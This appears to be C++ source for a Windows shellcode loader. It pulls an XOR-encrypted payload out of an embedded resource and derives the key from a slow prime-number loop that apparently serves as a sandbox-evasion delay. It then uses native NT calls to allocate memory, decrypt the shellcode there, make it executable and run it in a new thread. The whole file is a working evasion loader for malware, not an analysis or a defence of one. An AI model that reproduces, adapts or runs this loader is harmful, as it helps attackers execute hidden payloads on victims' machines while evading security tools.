#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include "randy_marsh.h"
#include "resource.h"
#include <process.h>
#include <psapi.h>
#include <Windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)



void XORDecryption(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}






int McDaniels(int n) {

	int c = 0;

	for (int i = 1; i <= n; i++) {
		if (n % i == 0) {
			c++;
		}
	}

	if (c == 2) {
		return 2;
	}
	else {
		return 0;
	}

}

int main()
{
	
	

	HANDLE hProc = GetCurrentProcess();

	HGLOBAL resHandle = NULL;
	HRSRC res;
	unsigned char* stream;
	unsigned int stream_len;

	res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	stream = (unsigned char*)LockResource(resHandle);
	stream_len = SizeofResource(NULL, res);

	

	int flag, result = 1;
	unsigned int i = 0;

	for (i = 0; i <= 1000000;i++)
	{
		result = McDaniels(i);

		if (result == 2)
		{

			if (i >= 100000)
			{
				
				break;
			}

		}
		else
			continue;

	}

	char buffer[20];
	itoa(i, buffer, 10);

	unsigned char* tegridy1 = (unsigned char*)buffer;

	
	

	LPVOID baseAddress = NULL;


	size_t allocSize = stream_len;

	LPVOID rb;
	auto status =  NtAllocateVirtualMemory(hProc, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to Allocate memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully allocated RW memory at 0x%p of size %lld\n", baseAddress, allocSize);
	getchar();


	size_t shellcodeSize = sizeof(stream) / sizeof(stream[0]);


	status = NtWriteVirtualMemory(hProc, baseAddress, stream, stream_len, NULL);

	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to write at at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("Shell code written at Allocated Virtual Memory \n");
	getchar();

	XORDecryption((char*)baseAddress, stream_len, buffer, strlen((const char*)buffer) + 1);

	DWORD oldProtect;
	status = NtProtectVirtualMemory(hProc, &baseAddress, (PSIZE_T)&stream_len, PAGE_EXECUTE_READ, &oldProtect);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change permission to RWX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully changed memory protections to RX\n");
	getchar();


	HANDLE threadhandle;
	NtCreateThreadEx(&threadhandle, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	if (threadhandle == NULL) {
		CloseHandle(hProc);
		printf("ThreadHandle failed :( exiting...\n");
		return -2;
	}
	else {
		printf("Call to NtCreateThreadEx is success :)\n");
	}

	printf("waitforsingleobject is called \n");
	WaitForSingleObject(threadhandle, INFINITE);



	return 0;
}


